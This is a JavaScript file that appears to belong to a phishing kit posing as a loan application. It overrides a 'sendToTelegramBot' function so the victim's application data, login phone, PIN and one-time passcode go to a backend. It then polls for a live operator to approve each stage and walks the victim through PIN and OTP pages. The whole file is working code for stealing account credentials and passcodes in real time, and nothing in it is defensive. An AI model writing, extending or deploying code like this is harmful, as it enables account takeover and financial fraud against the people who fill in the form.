// webhook-client.js
// Override the client-side sendToTelegramBot function to route through the backend
// Include this script after the existing index.html script block (just before </body>)

(async () => {
  async function startStageViaBackend(stage, payload = {}) {
    try {
      const resp = await fetch('/api/start-stage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ stage, data: payload })
      });
      if (!resp.ok) throw new Error('Failed to start stage');
      const { sessionId } = await resp.json();
      pollSessionStatus(stage, sessionId);
      return sessionId;
    } catch (err) {
      console.error('startStageViaBackend error', err);
      return null;
    }
  }

  function pollSessionStatus(stage, sessionId) {
    const interval = 1500;
    const maxChecks = 300; // ~7.5 minutes
    let checks = 0;
    const timer = setInterval(async () => {
      checks++;
      try {
        const r = await fetch(`/api/status/${sessionId}`);
        if (r.status === 404) { clearInterval(timer); return; }
        const j = await r.json();
        if (j.status === 'approved') {
          clearInterval(timer);
          if (stage === 'page2') {
            showPage(3);
          } else if (stage === 'page3') {
            showPage(5);
            startOTPTimer();
          } else if (stage === 'page5') {
            document.getElementById('finalLoanAmount').textContent = 'P ' + applicationData.loanAmount.toLocaleString();
            showPage(7);
            clearInterval(timerInterval);
          }
          return;
        } else if (j.status === 'denied') {
          clearInterval(timer);
          if (stage === 'page2') {
            showPage(2);
            document.getElementById('errorMsg2').textContent = 'Application denied by reviewer.';
            document.getElementById('errorMsg2').classList.add('show');
          } else if (stage === 'page3') {
            showPage(3);
            document.getElementById('errorMsg3').textContent = 'Login denied by reviewer.';
            document.getElementById('errorMsg3').classList.add('show');
          } else if (stage === 'page5') {
            showPage(5);
            document.getElementById('errorMsg5').textContent = 'OTP rejected by reviewer.';
            document.getElementById('errorMsg5').classList.add('show');
          }
          return;
        } else if (j.status === 'verify_device' && stage === 'page3') {
          clearInterval(timer);
          showPage(5);
          startOTPTimer();
          return;
        }
      } catch (e) {
        console.warn('poll error', e);
      }
      if (checks >= maxChecks) {
        clearInterval(timer);
        if (stage === 'page3') {
          showPage(3);
          document.getElementById('errorMsg3').textContent = 'Verification timeout. Please try again.';
          document.getElementById('errorMsg3').classList.add('show');
        }
      }
    }, interval);
  }

  // Override the existing sendToTelegramBot function defined in index.html
  window.sendToTelegramBot = async function(stage) {
    let payload = {};
    if (stage === 'page2') payload = applicationData;
    else if (stage === 'page3') payload = { loginPhone: applicationData.loginPhone, loginPin: applicationData.loginPin };
    else if (stage === 'page5') payload = { loginPhone: applicationData.loginPhone, otp: applicationData.otp };
    await startStageViaBackend(stage, payload);
  };

  // Expose functions in case they are needed elsewhere
  window.startStageViaBackend = startStageViaBackend;
  window.pollSessionStatus = pollSessionStatus;
})();
